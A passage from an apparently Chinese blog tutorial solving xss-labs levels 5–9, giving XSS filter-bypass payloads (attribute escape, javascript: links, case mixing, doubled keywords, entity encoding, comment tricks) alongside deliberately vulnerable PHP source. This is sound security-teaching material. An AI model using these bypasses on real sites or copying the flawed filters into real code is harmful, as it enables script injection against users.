class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level6.php?keyword=break it out!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level5&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level5&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="comment">//使用str_replace替换字符  过滤了&lt;  使用伪协议不会涉及&lt; </span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str3</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//进一步解释实例化转义函数Htmlspecialchars()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// $str = &quot;Tom&#x27;s \&quot;house\&quot; &amp; &lt;garden&gt;&quot;;</span></span><br><span class="line"><span class="comment">// echo htmlspecialchars($str);                // 默认: Tom&#x27;s&amp;quot;house&amp;quot; &amp;amp; &amp;lt;garden&amp;gt;</span></span><br><span class="line"><span class="comment">// echo htmlspecialchars($str, ENT_QUOTES);    // 转义单引号: Tom&amp;#039;s &amp;quot;house&amp;quot; &amp;amp; &amp;lt;garden&amp;gt;</span></span><br><span class="line"><span class="comment">// echo htmlspecialchars($str, ENT_NOQUOTES);  // 不转义引号: Tom&#x27;s &quot;house&quot; &amp;amp; &amp;lt;garden&amp;gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level5.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str3</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p>类型：输入框类型</p>
<p>解题思路：</p>
<p>简化流程，由于是输入框类型，直接输入语句：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_21.png" class="" title="在这里插入图片描述">

<ul>
<li>双引号没有被实例化转义或过滤</li>
<li>实现了字符逃逸</li>
<li>script标签被替换</li>
<li>使用onclick,也会被替换（自主测试，不演示）</li>
</ul>
<p>过滤script则不用script,用伪协议</p>
<p>情况与level5类似，则选择语句：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;javascript:alert(&quot;123&quot;)&#x27;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">a</span>&gt;</span> //</span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_22.png" class="" title="在这里插入图片描述">
<p>此时的页面渲染</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_23.png" class="" title="在这里插入图片描述">
<ul>
<li>标签实现逃逸</li>
<li>href 被替换</li>
</ul>
<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="*大小写绕过"></a>*大小写绕过</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">sCript</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>);</span><span class="tag">&lt;/<span class="name">scRipt</span>&gt;</span> </span><br></pre></td></tr></table></figure>
<p>成功通关</p>
<ul>
<li>疑问：为什么前面的关卡不使用大小写绕过呢？或是说为什么这关可以使用大小写绕过？代码分析解答</li>
</ul>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level7.php?keyword=move up!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level6&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level6&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);  <span class="comment">//替换script标签</span></span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);          <span class="comment">//替换on </span></span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);		 <span class="comment">//替换src</span></span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);    <span class="comment">//替换data</span></span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);   <span class="comment">//替换href</span></span><br><span class="line"><span class="comment">//常规的伪协议无法绕过</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//这里存在两个很大的破绽:</span></span><br><span class="line"><span class="comment">//1.没有先实例化转义变量$str6,只是进行’部分有限‘的’黑名单‘标签替换，就拼接到value的值，</span></span><br><span class="line"><span class="comment">//2.str_replace函数默认区分大小写的且是严格匹配的（只有一样的字符才会被替换）</span></span><br><span class="line"><span class="comment">//1+2-&gt;大小写绕过</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//前面的关卡中 level1根本没必要替换 level2在拼接value的值之前就实例化转义了 level3 level4 level5 同理</span></span><br><span class="line"><span class="comment">//为什么在拼接value的值之前就实例化转义了就无法使用大小写绕过呢？</span></span><br><span class="line"><span class="comment">//首先，输入框类型的重点在于如何处理value 1.闭合-&gt;逃逸  2.加属性 </span></span><br><span class="line"><span class="comment">//加属性不需要讨论，要实现逃逸就要使用&quot;闭合value,但&quot;被实例化转义，因此大小写绕过不能实现，即都没有满足1，即使满足2，也无法实现大小写绕过</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level6.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str6</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><p>类型：输入款类型</p>
<p>解题思路：<br>输入测试语句：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_24.png" class="" title="在这里插入图片描述">

<ul>
<li>script 被替换为空</li>
<li>成功逃逸</li>
<li>双引号没有别实例化转义或替换</li>
</ul>
<p>输入语句：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">sCript</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>);</span><span class="tag">&lt;/<span class="name">scRipt</span>&gt;</span> </span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_25.png" class="" title="在这里插入图片描述">

<ul>
<li>两次测试结果一样，那就说明有点异样了</li>
<li>说明被变量的英文字符被统一转为小写后再进行替换</li>
</ul>
<p>输入语句：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;javascript:alert(&quot;123&quot;)&#x27;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_26.png" class="" title="在这里插入图片描述">

<ul>
<li>实现逃逸</li>
<li>javascript中的script被替换为空</li>
<li>下面的 “”&gt;” 实为原有input标签的后面部分–&gt;浏览器的容错</li>
<li>href也替换为空</li>
</ul>
<blockquote>
<p>由以上的三次测试，发现闭合逃逸是可以实现的，只不过是某些标签和属性会被替换为空。</p>
</blockquote>
<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="*双写绕过"></a>*双写绕过</h3><p>输入语句：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">scscriptript</span>&gt;</span>alert(&quot;123&quot;);<span class="tag">&lt;/<span class="name">scscriptript</span>&gt;</span> </span><br><span class="line">&quot; oonnclick=&#x27;alert(&quot;123&quot;)&#x27;</span><br></pre></td></tr></table></figure>

<ul>
<li>分析双写</li>
</ul>
<p>scscriptript 第一次匹配从第三个字符开始，即sc script ript 删除后即为 script</p>
<p> 对于其他伪协议等测试不不再测试（写得太累了(&lt;!_!&gt;)）–&gt;源码分析</p>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level8.php?keyword=nice try!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level7&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level7&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> =<span class="title function_ invoke__">strtolower</span>( <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level7.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输入框类型中需要闭合value的类型实现双写绕过的三个条件：</span></span><br><span class="line"><span class="comment">//1.在拼接value之前，变量没有被实例化转义（&quot;会被实例化转义）</span></span><br><span class="line"><span class="comment">//2.对应字符别替换为空</span></span><br><span class="line"><span class="comment">//3.在整个过程中，只实现一次替换</span></span><br><span class="line"><span class="comment">//1+2+3-&gt;双写绕过</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level7.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str6</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p>类型：输入框类型</p>
<p>解题思路：</p>
<p>输入：test</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_27.png" class="" title="在这里插入图片描述">

<ul>
<li>输入内容被拼接到超链接中-&gt;可以尝试伪协议</li>
</ul>
<p> 输入： javascript:alert(“123”)</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_28.png" class="" title="在这里插入图片描述">
<ul>
<li>javascript中的script被替换,且不是替换为空</li>
<li>括号内的第一个双引号被实例化转义</li>
</ul>
<p> （其他伪协议类型自主测试）</p>
<p>由上可知：</p>
<ul>
<li>括号内不应再使用双引号，尝试使用单引号</li>
</ul>
<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="*编码绕过"></a>*编码绕过</h3><p>原理：*补充知识 目录有解释</p>
<blockquote>
<p>原语句：javascript:alert(“123”)<br>unicode 编码（16进制）：</p>
<blockquote>
<p><code>&amp;#x006a&amp;#x0061&amp;#x0076&amp;#x0061&amp;#x0073&amp;#x0063&amp;#x0072&amp;#x0069&amp;#x0070&amp;#x0074&amp;#x003a&amp;#x0061&amp;#x006c&amp;#x0065&amp;#x0072&amp;#x0074&amp;#x0028&amp;#x0022&amp;#x0031&amp;#x0032&amp;#x0033&amp;#x0022&amp;#x0029 </code></p>
</blockquote>
</blockquote>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_29.png" class="" title="在这里插入图片描述">
<p>成功绕过</p>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level9.php?keyword=not bad!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level8&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level8&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);  <span class="comment">//统一转为小写-&gt;防止大小写绕过</span></span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line"><span class="comment">//以上为替换字符</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level8.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line"> <span class="comment">//添加链接使用了最为简单的方法：echo 加标签</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str7</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><p>类型：输入框类型</p>
<p>解题思路：</p>
<p>查看网页源码可知,可以尝试插入伪协议</p>
<p>但是,无论输入那种伪协议，网页源码始终为：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_30.png" class="" title="在这里插入图片描述">

<p>输入:</p>
<blockquote>
<p>http:&#x2F;&#x2F;<br>至于为什么输入，全靠经验</p>
</blockquote>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_31.png" class="" title="在这里插入图片描述">
<p>输入:</p>
<blockquote>
<p> 123http:&#x2F;&#x2F;<br> http:&#x2F;&#x2F; ashjdhj<br>以上语句都会被添加</p>
</blockquote>
<ul>
<li>所以只要识别到http:&#x2F;&#x2F;就会添加（源码分析会解释）</li>
</ul>
<h3 id="注释："><a href="#注释：" class="headerlink" title="*注释："></a>*注释：</h3><p> 现在思考如何将 http:&#x2F;&#x2F;嵌入伪协议的js代码中而不影响其执行<br> -&gt;使用注释</p>
<blockquote>
<p>&#x2F;&#x2F;  在js中为单行注释<br>&#x2F;**&#x2F; 在js中为多行注释</p>
</blockquote>
<p>尝试输入：</p>
<blockquote>
<p>javascript:alert(‘123’)&#x2F;* http:&#x2F;&#x2F; *&#x2F;<br>javascript:alert(‘123’)&#x2F;&#x2F; http:&#x2F;&#x2F; </p>
</blockquote>
<p>都可以被成功添加</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_32.png" class="" title="在这里插入图片描述">

<ul>
<li>script被替换且不为空-&gt;尝试大小写绕过</li>
</ul>
<p>输入：</p>
<blockquote>
<p>javasCript:alert(‘123’) &#x2F;<em>http:&#x2F;&#x2F;</em>&#x2F;</p>
</blockquote>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_33.png" class="" title="在这里插入图片描述">

<ul>
<li>可知变量被统一转为小写，后被替换</li>
</ul>
<p>尝试：注释+编码</p>
<p>输入：</p>
